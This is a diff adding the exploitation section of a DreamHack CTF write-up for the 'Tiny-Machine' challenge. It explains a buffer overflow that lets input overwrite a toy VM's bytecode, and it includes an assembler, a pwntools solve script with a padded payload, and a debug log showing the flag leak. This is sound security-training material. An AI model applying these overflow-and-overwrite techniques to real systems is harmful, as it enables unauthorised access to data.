@@ -309,21 +309,251 @@ while (true) {
 
 ### Exploitation
 
-So, what's the vulnerability?
+# So, what's the vulnerability?
 
 Well it's really obvious, there's a buffer overflow due to how it handles the *read* operation.
 
 Rather than limiting the number of bytes to read into the buffer based on the exact size of the vm input buffer it rather uses our input to determine when to stop.
 
-What can we leverage with this?
+# What can we leverage with this?
 
 Since the data (flag, input, vm bytecode) are all contiguous in memory we can leverage this overflow to overwrite the vm bytecode thus having control flow over the vm.
 
-What to overwrite? 
+```bash
+[ FLAG ][ USER INPUT BUFFER ][ VM BYTECODE ]
+```
+
+# What to overwrite? 
 
 We know that the flag is already in memory, so we simply just need a way to print it out.
 
 This is the approach I made use of.
 
-Since we know th
+Since we know the index starts from *29*, overwriting this to *0* would start printing from index *0* relative to *mem* thus leaking the flag.
 
+```c
+0x0F1: MOV_R_IMM r2, #29
+```
+
+I made an assembler to aid me with this, here's the full code:
+
+
+```python
+# tinyvm.py
+
+class TinyMachine():
+    def __init__(self):
+        self.OPCODES = {
+            0: "LOAD",
+            1: "STORE",
+            2: "MOV_R_IMM",
+            3: "MOV_R_R",
+            4: "ADD_R_R",
+            5: "ADD_R_IMM",
+            6: "JNZ",
+            7: "JMP",
+            8: "EXT",
+        }
+
+        self.MNEMONICS = {v: k for k, v in self.OPCODES.items()}
+
+
+    def assemble(self, text):
+            if isinstance(text, bytes):
+                text = text.decode()
+            
+            machine = bytearray()
+
+            for line in text.splitlines():
+                line = line.strip()
+                if not line or line.startswith(";"):
+                    continue
+
+                parts = line.replace(",", " ").split()
+                mnemonic = parts[0].upper()
+
+                if mnemonic not in self.MNEMONICS:
+                    raise ValueError(f"Unknown instruction '{mnemonic}'")
+
+                opcode = self.MNEMONICS[mnemonic]
+
+                if opcode == 8:
+                    machine.append(opcode)
+                    continue
+
+                if opcode in (6, 7):
+                    if len(parts) != 2:
+                        raise ValueError(f"{mnemonic} requires 1 operand")
+
+                    offset = int(parts[1], 0) & 0xFF
+                    machine.append(opcode)
+                    machine.append(offset)
+                    continue
+
+                if opcode in (0,1,2,3,4,5):
+                    if len(parts) != 3:
+                        raise ValueError(f"{mnemonic} requires 2 operands")
+
+                    dest = int(parts[1].lstrip("r"), 0) & 0xFF
+
+                    src_str = parts[2]
+
+                    if src_str.startswith("r"):
+                        src = int(src_str[1:], 0) & 0xFF
+                    elif src_str.startswith("#"):
+                        src = int(src_str[1:], 0) & 0xFF
+                    else:
+                        raise ValueError(f"Invalid operand '{src_str}'")
+
+                    machine.append(opcode)
+                    machine.append(dest)
+                    machine.append(src)
+                    continue
+
+                raise ValueError(f"Unhandled opcode {opcode}")
+
+            return bytes(machine)
+
+
+    def disasm(self, memory, start=0, end=None):
+        if end is None:
+            end = len(memory)
+
+        ip = start
+        while ip < end:
+            opcode = memory[ip]
+            mnem = self.OPCODES.get(opcode, f"UNK({opcode})")
+
+            if opcode in (0,1,2,3,4,5):
+                dest = memory[ip+1]
+                src  = memory[ip+2]
+
+                if opcode == 0:
+                    op_str = f"{mnem} r{dest}, mem[r{src}]"
+                elif opcode == 1:
+                    op_str = f"{mnem} mem[r{dest}], r{src}"
+                elif opcode == 2:
+                    op_str = f"{mnem} r{dest}, #{src}"
+                elif opcode == 5:
+                    op_str = f"{mnem} r{dest}, #{src}"
+                else:
+                    op_str = f"{mnem} r{dest}, r{src}"
+
+                print(f"0x{ip:03X}: {op_str}")
+                ip += 3
+
+            elif opcode == 6: 
+                offset = memory[ip+1]
+                print(f"0x{ip:03X}: {mnem} 0x{(ip+offset) & 0xff:03X}")
+                ip += 2
+
+            elif opcode == 7: 
+                offset = memory[ip+1]
+                print(f"0x{ip:03X}: {mnem} 0x{(ip+offset)&0xff:03x}")
+                ip += 2
+
+            elif opcode == 8:
+                print(f"0x{ip:03X}: EXT")
+                ip += 1
+
+            else:
+                print(f"0x{ip:03X}: UNKNOWN({opcode})")
+                ip += 1
+
+```
+
+And my solve script:
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from tinyvm import TinyMachine
+
+context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
+context.log_level = 'debug'
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process(["python3", "tiny_machine.py"] + argv, *a, **kw)
+    
+
+def solve():
+
+    io = start()
+
+    vm = TinyMachine()
+    
+    sc = """
+        MOV_R_IMM r0, #1
+        JMP 2
+        EXT
+        STORE r2, r1
+        ADD_R_IMM r2, #1
+        ADD_R_IMM r1, #246
+        JNZ 244
+        MOV_R_IMM r0, #1
+        MOV_R_IMM r2, #0
+        LOAD r1, r2
+        EXT
+        ADD_R_IMM r2, #1
+        ADD_R_IMM r1, #1
+        JNZ 246
+    """
+
+    sc = vm.assemble(sc)
+    
+    offset = 191
+    payload = b"\xff" + cyclic(offset) + sc
+
+    io.sendline(payload)
+
+    io.interactive()
+
+
+def main():
+    
+    solve()
+    
+
+if __name__ == '__main__':
+    main()
+```
+
+Running it!!
+
+```bash
+~/Desktop/Lab/DreamHack/Pwn/Tiny-Machine ❯ python3 solve.py                                   
+[+] Starting local process '/usr/bin/python3' argv=[b'python3', b'tiny_machine.py'] : pid 244757
+[DEBUG] Sent 0xe4 bytes:
+    00000000  ff 61 61 61  61 62 61 61  61 63 61 61  61 64 61 61  │·aaa│abaa│acaa│adaa│
+    00000010  61 65 61 61  61 66 61 61  61 67 61 61  61 68 61 61  │aeaa│afaa│agaa│ahaa│
+    00000020  61 69 61 61  61 6a 61 61  61 6b 61 61  61 6c 61 61  │aiaa│ajaa│akaa│alaa│
+    00000030  61 6d 61 61  61 6e 61 61  61 6f 61 61  61 70 61 61  │amaa│anaa│aoaa│apaa│
+    00000040  61 71 61 61  61 72 61 61  61 73 61 61  61 74 61 61  │aqaa│araa│asaa│ataa│
+    00000050  61 75 61 61  61 76 61 61  61 77 61 61  61 78 61 61  │auaa│avaa│awaa│axaa│
+    00000060  61 79 61 61  61 7a 61 61  62 62 61 61  62 63 61 61  │ayaa│azaa│bbaa│bcaa│
+    00000070  62 64 61 61  62 65 61 61  62 66 61 61  62 67 61 61  │bdaa│beaa│bfaa│bgaa│
+    00000080  62 68 61 61  62 69 61 61  62 6a 61 61  62 6b 61 61  │bhaa│biaa│bjaa│bkaa│
+    00000090  62 6c 61 61  62 6d 61 61  62 6e 61 61  62 6f 61 61  │blaa│bmaa│bnaa│boaa│
+    000000a0  62 70 61 61  62 71 61 61  62 72 61 61  62 73 61 61  │bpaa│bqaa│braa│bsaa│
+    000000b0  62 74 61 61  62 75 61 61  62 76 61 61  62 77 61 61  │btaa│buaa│bvaa│bwaa│
+    000000c0  02 00 01 07  02 08 01 02  01 05 02 01  05 01 f6 06  │····│····│····│····│
+    000000d0  f4 02 00 01  02 02 00 00  01 02 08 05  02 01 05 01  │····│····│····│····│
+    000000e0  01 06 f6 0a                                         │····│
+    000000e4
+[*] Switching to interactive mode
+[DEBUG] Received 0x19 bytes:
+    b'\n'
+    b'H{xxxxxxxxxxxxxxxxxxxxxx'
+
+H{xxxxxxxxxxxxxxxxxxxxxx[DEBUG] Received 0x6 bytes:
+    00000000  78 78 78 7d  c3 bf                                  │xxx}│··│
+    00000006
+xxx}ÿ
+[*] Got EOF while reading in interactive
+```
+
+And viola we get the flag :fingerguns:
